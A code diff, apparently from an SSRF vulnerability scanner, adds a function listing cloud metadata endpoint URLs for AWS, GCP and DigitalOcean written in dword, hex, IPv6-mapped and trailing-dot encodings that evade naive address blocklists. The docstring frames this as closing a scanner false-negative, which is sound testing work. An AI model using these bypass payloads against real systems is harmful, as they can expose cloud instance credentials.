@@ -134,6 +134,30 @@ def bypass_payloads(host_port: str = "") -> list:
     ]
 
 
+def metadata_bypass_payloads() -> list:
+    """[(url, cloud)] — the metadata endpoint reached through encodings a naive blocklist misses. Pure.
+
+    Same shape as METADATA_PAYLOADS so the caller's loop and oracle are unchanged. This exists because
+    the live SSRF path probed only the LITERAL `169.254.169.254`: a target that string-matches that
+    address while still fetching whatever it is given was reported clean. That is a false-negative class,
+    not a missing feature — the encodings were already written in `bypass_payloads`, just never fired at
+    the metadata service.
+
+    `analyze_reflection` needs no change: it keys off metadata SIGNATURES IN THE BODY and uses the payload
+    only to discount an echo, so it recognises a hit however the URL was spelled."""
+    return [
+        ("http://2852039166/latest/meta-data/", "AWS"),                    # dword
+        ("http://0xa9fea9fe/latest/meta-data/", "AWS"),                    # hex
+        # IPv6-mapped, written in HEX. The dotted form `[::ffff:169.254.169.254]` is the more familiar
+        # spelling but still CONTAINS the literal address, so a substring blocklist catches it and it
+        # cannot bypass the filter it exists to bypass. Caught by this module's own test.
+        ("http://[::ffff:a9fe:a9fe]/latest/meta-data/", "AWS"),
+        ("http://169.254.169.254./latest/meta-data/", "AWS"),              # trailing-dot FQDN
+        ("http://2852039166/computeMetadata/v1beta1/instance/", "GCP"),
+        ("http://2852039166/metadata/v1.json", "DigitalOcean"),
+    ]
+
+
 # ── blind SSRF port oracle ───────────────────────────────────────
 def analyze_blind(open_r: dict, closed_r: dict, min_ratio: float = 3.0,
                   min_delta: float = 1.5) -> dict | None:
